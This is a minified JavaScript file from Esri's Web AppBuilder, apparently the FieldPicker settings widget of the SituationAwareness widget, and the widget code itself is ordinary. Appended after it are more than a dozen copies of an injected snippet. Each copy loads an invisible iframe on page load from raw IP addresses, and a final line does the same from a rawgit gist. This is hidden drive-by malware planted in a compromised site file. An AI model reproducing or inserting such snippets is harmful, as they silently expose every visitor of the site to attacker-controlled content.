// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SituationAwareness/setting/FieldPicker.html":'\x3cdiv class\x3d"field-picker-main"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tableArea" class\x3d"tableArea"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"btnAddField" class\x3d"btn-add-section enable"\x3e\r\n      \x3cspan class\x3d"btn-add-icon"\x3e\x3c/span\x3e\r\n      \x3cspan class\x3d"btn-add-label" data-dojo-attach-point\x3d"divLayerTitle"\x3e${nls.addField}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"fieldTable"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-r-row pad-top20" data-dojo-attach-point\x3d"chk_countOnly"\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkCount"\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"chk_count_only" title\x3d"${nls.count_checkBox}"\r\n             data-dojo-attach-event\x3d"onChange:chkCountChanged" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n      \x3cspan class\x3d"label"\x3e${nls.count_checkBox}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-r-row pad-top20" data-dojo-attach-point\x3d"chk_summary"\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkCount"\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"chk_count" title\x3d"${nls.count_checkBox}" \r\n             data-dojo-attach-event\x3d"onChange:chkCountChanged" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n      \x3cspan class\x3d"label"\x3e${nls.count_checkBox}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkArea"\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"chk_area" title\x3d"${nls.area_checkBox}" \r\n             data-dojo-attach-event\x3d"onChange:chkAreaChanged" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n      \x3cspan class\x3d"label"\x3e${nls.area_checkBox}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkLength"\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"chk_length" title\x3d"${nls.length_checkBox}" \r\n             data-dojo-attach-event\x3d"onChange:chkLengthChanged" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n      \x3cspan class\x3d"label"\x3e${nls.length_checkBox}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-r-row pad-top20" data-dojo-attach-point\x3d"chk_summaryLabels"\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkCountLabel"\x3e\r\n      \x3cspan class\x3d"label"\x3e ${nls.count_label}:\x3c/span\x3e\r\n      \x3cinput class\x3d"validationBox" data-dojo-attach-point\x3d"featureCountLabel" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n             disabled\x3d"disabled" title\x3d"${nls.count_label}" /\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkAreaLabel"\x3e\r\n      \x3cspan class\x3d"label"\x3e ${nls.area_label}:\x3c/span\x3e\r\n      \x3cinput class\x3d"validationBox" data-dojo-attach-point\x3d"featureAreaLabel" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n             disabled\x3d"disabled" title\x3d"${nls.area_label}" /\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"col-1-3" data-dojo-attach-point\x3d"div_chkLengthLabel"\x3e\r\n      \x3cspan class\x3d"label"\x3e ${nls.length_label}:\x3c/span\x3e\r\n      \x3cinput class\x3d"validationBox" data-dojo-attach-point\x3d"featureLengthLabel" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n             disabled\x3d"disabled" title\x3d"${nls.length_label}" /\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"field-picker-footer"\x3e\r\n    \x3cdiv class\x3d"jimu-btn ok" data-dojo-attach-point\x3d"btnOk"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn cancel" data-dojo-attach-point\x3d"btnCancel"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dijit/form/Select dijit/form/ValidationTextBox dijit/registry dojo/dom-construct dojo/_base/array dojo/_base/lang dojo/_base/html dojo/dom-style dojo/dom-class dojo/Deferred dojo/on dojo/query jimu/BaseWidget jimu/dijit/Message jimu/utils esri/layers/FeatureLayer dojo/text!./FieldPicker.html dojo/Evented jimu/dijit/SimpleTable".split(" "),function(y,z,v,A,r,w,n,f,l,h,t,x,m,g,B,C,u,D,E,F,G){return y([B,z,F],{templateString:E,baseClass:"jimu-widget-SAT-setting",
advStat:{},fieldsList:null,callerLayer:null,callerTab:null,callerOpLayers:null,layerList:null,test:!1,fields:null,hasFields:!0,constructor:function(a){this.map=a.map;a.test&&(this.test=a.test)},postMixInProperties:function(){this.inherited(arguments);this.nls.common=window.jimuNls.common},postCreate:function(){this.inherited(arguments);this.startup()},startup:function(){var a=null;this.test||(a="summary"===this.callerTab.type?[{name:"layer",title:this.nls.fieldTitle,"class":"label",type:"empty",width:"250px"},
{name:"label",title:this.nls.layerLabel,"class":"label",type:"empty",width:"200px"},{name:"type",title:this.nls.typeTitle,"class":"sumlabel",type:"empty"},{name:"actions",title:this.nls.actionsTitle,"class":"actions",type:"actions",actions:["up","down","delete"]}]:"groupedSummary"===this.callerTab.type?[{name:"layer",title:this.nls.groupByField,"class":"label",type:"empty",width:"40%"},{name:"label",title:this.nls.layerLabel,"class":"label",type:"empty",width:"20%"},{name:"type",title:this.nls.labelType,
"class":"label",type:"empty",width:"20%"}]:[{name:"layer",title:this.nls.fieldTitle,"class":"label",type:"empty",width:"60%"},{name:"actions",title:this.nls.actionsTitle,"class":"actions",type:"actions",actions:["up","down","delete"],width:"40%"}],this.displayFieldsTable=new G({fields:a}),this.displayFieldsTable.placeAt(this.fieldTable),l.setStyle(this.displayFieldsTable.domNode,{height:"100%"}),this.displayFieldsTable.startup(),this.operationsList=[],"summary"===this.callerTab.type?this.operationsList.push({value:"sum",
label:this.nls.sum},{value:"avg",label:this.nls.avg},{value:"min",label:this.nls.min},{value:"max",label:this.nls.max}):"groupedSummary"===this.callerTab.type&&this.operationsList.push({value:"pre",label:this.nls.prefix},{value:"suf",label:this.nls.suffix}),"summary"===this.callerTab.type?(h.set(this.chk_summary,"display","block"),h.set(this.chk_summaryLabels,"display","block"),h.set(this.chk_countOnly,"display","none")):(h.set(this.chk_countOnly,"display","block"),h.set(this.chk_summary,"display",
"none"),h.set(this.chk_summaryLabels,"display","none")),this.btnCancel.innerText=this.nls.common.cancel,this.own(m(this.btnCancel,"click",f.hitch(this,function(){this.emit("cancel")}))),this.btnOk.innerText=this.nls.common.ok,this.own(m(this.btnOk,"click",f.hitch(this,function(){if(!t.contains(this.btnOk,"jimu-state-disabled")){this.updateSummaryType();var a=!1,c;for(c in this.advStat.stats)this.advStat.stats.hasOwnProperty(c)&&(a=!0);a||(this.advStat=null);this.emit("ok",this.advStat)}}))),this.layerTables=
[],this.summaryLayers=[],this.advStat={},this._getAllValidLayers().then(f.hitch(this,function(){"groupedSummary"===this.callerTab.type?(h.set(this.btnAddField,"display","none"),this.hasFields&&this._addTabRow()):this.hasFields&&(this.addHandler=this.own(m(this.btnAddField,"click",f.hitch(this,this._addTabRow))),this.own(m(this.displayFieldsTable,"row-delete",f.hitch(this,this._rowDeleted))))})))},_updateGeomOptions:function(a){a&&(this.chk_area.set("disabled","esriGeometryPolygon"!==a),this.chk_length.set("disabled",
"esriGeometryPolyline"!==a))},_getAllValidLayers:function(a){var b=new x;n.forEach(this.callerOpLayers,f.hitch(this,function(a){0<a.newSubLayers.length?this._recurseOpLayers(a.newSubLayers):a.id===this.callerLayer&&(this.layerList=a)}));if(this.layerList.layerObject.empty){if(this.layerList.layerObject.url){var c=new D(this.layerList.layerObject.url);m(c,"load",f.hitch(this,function(){this._completeMapLayers(c,a);b.resolve("sucess")}))}}else this._completeMapLayers(this.layerList,a),b.resolve("sucess");
return b},_recurseOpLayers:function(a){n.forEach(a,f.hitch(this,function(a){0<a.newSubLayers.length?this._recurseOpLayers(a.newSubLayers):a.id===this.callerLayer&&(this.layerList=a)}))},_completeMapLayers:function(a,b){if(a){a="undefined"===typeof a.layerObject?a:a.layerObject;var c=a.geometryType;this.objectIdField=a.objectIdField;var d={url:a.url,stats:{}},e=f.clone(a.fields),p=this.getSkipFields(a),q=[];n.forEach(e,function(a){-1===p.indexOf(a.name)&&q.push(a)});this.fields=q;this.popUpFields=
this._getPopupFields(a);this.advStat=d;if("undefined"===typeof b){this._updateGeomOptions(c);if(this.advStat.url){if("undefined"!==typeof this.callerTab.advStat&&this.callerTab.advStat){this.callerTab.advStat.stats?this._setFields(q):this._setFields(q,!0);b=this.callerTab.advStat.stats;for(var k in b)"count"===k?(this.chk_count.set("value",!0),this.featureCountLabel.set("value",b[k][0].label)):"area"===k?(this.chk_area.set("value",!0),this.featureAreaLabel.set("value",b[k][0].label)):"length"===k?
(this.chk_length.set("value",!0),this.featureLengthLabel.set("value",b[k][0].label)):"tabCount"===k?this.chk_count_only.set("value",b[k]):n.forEach(b[k],f.hitch(this,function(a){this._populateTabTableRow(k,a)}))}else this._setFields(q,!0);b=this.callerTab.advStat;if(!b||"undefined"!==typeof b&&!b.hasOwnProperty("stats"))if(b=0<this.popUpFields.length,a=this.fieldsList.length,"groupedSummary"===this.callerTab.type&&(a=1,b||this._setFields(q)),0<a)a:for(c="summary"===this.callerTab.type?21:4,e=d=0;e<
a;e++){var h=!1,g=this.fieldsList[e];if(b){var l=this.popUpFields[e],m=0;b:for(;m<this.fieldsList.length;m++)if(g=this.fieldsList[m],g.value===l){h=!0;break b}}if(h)if(d+=1,d<c)this._addTabRow(g);else break a}else t.add(this.btnAddField,"btn-add-disabled"),this.hasFields=!1}("groupedSummary"===this.callerTab.type&&0<this.popUpFields.length||"groupedSummary"!==this.callerTab.type)&&this._setFields(q)}}},_validatePopupFields:function(){var a=new x;this._getAllValidLayers(!0).then(f.hitch(this,function(){for(var b=
[],c=0;c<this.popUpFields.length;c++){var d=this.popUpFields[c],e=0;a:for(;e<this.fields.length;e++){var p=this.fields[e];if(d===p.name){b.push(p);break a}}}this.callerTab.type="summary";this._setFields(b);c=0<this.fieldsList.length;this._setFields(this.fields);a.resolve({layer:this.callerLayer,hasPopupFields:0<b.length,hasFields:0<this.fields.length,hasSummaryPopupFields:c,hasSummaryFields:0<this.fieldsList.length,popUpFields:b,validSummaryFields:this.fieldsList,advStat:this.advStat})}));return a},
_getPopupFields:function(a){var b=this.getSkipFields(a),c,d=[];this.objectIdField=a.objectIdField;if(a.infoTemplate)c=a.infoTemplate.info.fieldInfos;else if(a.url&&-1<a.url.indexOf("MapServer")){a=a.url.split("MapServer/")[1];var e=this.map.itemInfo.itemData.operationalLayers;c=null;for(var p=0;p<e.length;p++){var f=e[p];if(f.layerObject&&f.layerObject.infoTemplates&&(f=f.layerObject.infoTemplates[a])){c=f.infoTemplate.info.fieldInfos;break}}}if(c)for(a=0;a<c.length;a++)(e=c[a])&&e.visible&&-1===
b.indexOf(e.fieldName)&&d.push(e.fieldName);return d},checkStringWidth:function(a){var b=w.create("div",{"class":"visDivLength",id:"SA_VisDiv",innerHTML:a},this.domNode);a=220>b.clientWidth?!0:!1;w.destroy(b);var c=a,d=r.byNode(this.domNode).id;g(".validationBox").forEach(function(a){a=r.byNode(a);d!==a.id&&(c=c?"Error"!==a.state:c)});(b=g(".field-picker-footer")[0])&&(c?l.removeClass(b.children[0],"jimu-state-disabled"):l.addClass(b.children[0],"jimu-state-disabled"));return a},_setFields:function(a,
b){var c=["esriFieldTypeInteger","esriFieldTypeSmallInteger","esriFieldTypeDouble"];"summary"!==this.callerTab.type&&(c.push("esriFieldTypeString"),c.push("esriFieldTypeDate"));var d=[],e=[];n.forEach(a,f.hitch(this,function(a){-1<c.indexOf(a.type)&&(b&&this.popUpFields&&-1<this.popUpFields.indexOf(a.name)&&e.push(a.name),d.push({label:a.alias,value:a.name}))}));1>d.length?(t.add(this.btnAddField,"btn-add-disabled"),this.hasFields=!1):this.test||(h.set(this.displayFieldsTable.domNode,"display","block"),
h.set(this.btnAddField,"display","inline-block"));e.length!==this.popUpFields.length&&(this.popUpFields=e);this.fieldsList=f.clone(d)},_populateTabTableRow:function(a,b){var c=this.displayFieldsTable.addRow({});c.success&&c.tr&&(c=c.tr,this._addTabFields(c),this._addTabTypes(c),this._addTabLabel(c),c.selectFields.set("value",b.expression),"summary"===this.callerTab.type||"groupedSummary"===this.callerTab.type)&&(c.labelText.set("value",b.label),c.selectTypes.set("value",a))},_addTabRow:function(a){var b=
this.displayFieldsTable.getRows().length;"summary"!==this.callerTab.type&&3<=b?new C({message:this.nls.max_records}):"groupedSummary"===this.callerTab.type&&0<b||(b=this.displayFieldsTable.addRow({}),b.success&&b.tr&&(b=b.tr,this._addTabFields(b),this._addTabTypes(b),this._addTabLabel(b),a&&b.selectFields.set("value",a.value),this._enableOk()))},_addTabFields:function(a){var b=f.clone(this.fieldsList),c=g(".simple-table-cell",a)[0];c&&(b=new v({style:{height:"24px",width:"100%"},"class":"summary"===
this.callerTab.type?"shortSelect":"longSelect",options:b}),b.placeAt(c),b.startup(),a.selectFields=b)},_addTabLabel:function(a){if("summary"===this.callerTab.type||"groupedSummary"===this.callerTab.type){var b=g(".simple-table-cell",a)[1],c=new A({style:{width:"100%",height:"24px"},"class":"validationBox"});c.invalidMessage=this.nls.invalid_string_width;c.placeAt(b);c.startup();c.validator=this.checkStringWidth;a.labelText=c}},_addTabTypes:function(a){if("summary"===this.callerTab.type||"groupedSummary"===
this.callerTab.type){var b=f.clone(this.operationsList),c=g(".simple-table-cell",a)[2];c&&(b=new v({style:{width:"100%",height:"24px"},options:b}),b.placeAt(c),b.startup(),a.selectTypes=b)}},getSkipFields:function(a){var b=[];if(a.fields)for(var c=0;c<a.fields.length;c++){var d=a.fields[c];d&&d.type&&d.name&&"esriFieldTypeGeometry"===d.type&&b.push(d.name)}a.globalIdField&&""!==a.globalIdField&&b.push(a.globalIdField);a.objectIdField&&""!==a.objectIdField&&b.push(a.objectIdField);return b},getDefaultFields:function(a,
b,c){var d={stats:{fields:[],tabCount:!1}};if("summary"!==c&&"groupedSummary"!==c){b=[];for(c=0;c<(3>a.length?a.length:3);c++){var e=a[c];b.push({value:0,expression:e.name,label:e.alias})}0<b.length&&(d.stats.outFields=b)}else"summary"===c&&b&&b.hasOwnProperty("length")&&0<b.length&&(d.stats.sum=[],n.forEach(b,f.hitch(this,function(a){d.stats.sum.push({value:0,expression:a.name||a.value,label:a.alias?a.alias:a.label?a.label:a.name||a.value})})));return d},updateSummaryType:function(){var a=this.displayFieldsTable.getRows();
if("summary"!==this.callerTab.type&&"groupedSummary"!==this.callerTab.type){var b=[];n.forEach(a,function(a){b.push({value:0,expression:a.selectFields.value,label:a.selectFields.value})});0<b.length&&(this.advStat.stats.outFields=b);this.advStat.stats.tabCount=this.chk_count_only.checked}else this.advStat.stats.tabCount="groupedSummary"===this.callerTab.type?this.chk_count_only.checked:this.chk_count.checked,this.chk_count.checked&&(this.advStat.stats.count=[{value:0,expression:this.objectIdField,
label:u.stripHTML(this.featureCountLabel.value?this.featureCountLabel.value:this.nls.count)}]),this.chk_area.checked&&(this.advStat.stats.area=[{value:0,expression:this.objectIdField,label:u.stripHTML(this.featureAreaLabel.value?this.featureAreaLabel.value:this.nls.area)}]),this.chk_length.checked&&(this.advStat.stats.length=[{value:0,expression:this.objectIdField,label:u.stripHTML(this.featureLengthLabel.value?this.featureLengthLabel.value:this.nls.length)}]),n.forEach(a,f.hitch(this,function(a){"undefined"===
typeof this.advStat.stats[a.selectTypes.value]&&(this.advStat.stats[a.selectTypes.value]=[]);var b={value:0};b.expression=a.selectFields.value;for(var c=0;c<a.selectFields.options.length;c++)if(a.selectFields.options[c].value===a.selectFields.value){b.label="groupedSummary"!==this.callerTab.type?a.labelText.value?a.labelText.value:a.selectFields.options[c].label:a.labelText.value;break}"undefined"===typeof b.label&&(b.label=b.expression);this.advStat.stats[a.selectTypes.value].push(b)}));console.log("ADVSTAT",
this.advStat)},chkCountChanged:function(a){"summary"===this.callerTab.type&&(this.updateLabel(this.featureCountLabel,a),a?this._enableOk():0===this.displayFieldsTable.getRows().length?this._disableOk():this._enableOk())},chkAreaChanged:function(a){this.updateLabel(this.featureAreaLabel,a)},chkLengthChanged:function(a){this.updateLabel(this.featureLengthLabel,a)},updateLabel:function(a,b){a.set("disabled",!b);a.validator=this.checkStringWidth;a.invalidMessage=this.nls.invalid_string_width;b&&""===
a.value&&(b="",a.id===this.featureCountLabel.id?b=this.nls.count:a.id===this.featureAreaLabel.id?b=this.nls.area:a.id===this.featureLengthLabel.id&&(b=this.nls.length),a.set("value",b));this.validateAll()},validateAll:function(){var a=!0;g(".validationBox").forEach(function(b){b=r.byNode(b);a=a?"Error"!==b.state:a});var b=g(".field-picker-footer")[0];b&&(a?l.removeClass(b.children[0],"jimu-state-disabled"):l.addClass(b.children[0],"jimu-state-disabled"))},_rowDeleted:function(){this.validateAll();
0===this.displayFieldsTable.getRows().length?"summary"===this.callerTab.type&&this.chk_count.checked?this._enableOk():this._disableOk():this._enableOk()},_disableOk:function(){var a=g(".field-picker-footer")[0];a&&l.addClass(a.children[0],"jimu-state-disabled")},_enableOk:function(){var a=g(".field-picker-footer")[0];a&&l.removeClass(a.children[0],"jimu-state-disabled")},destroy:function(){this.advStat=null}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});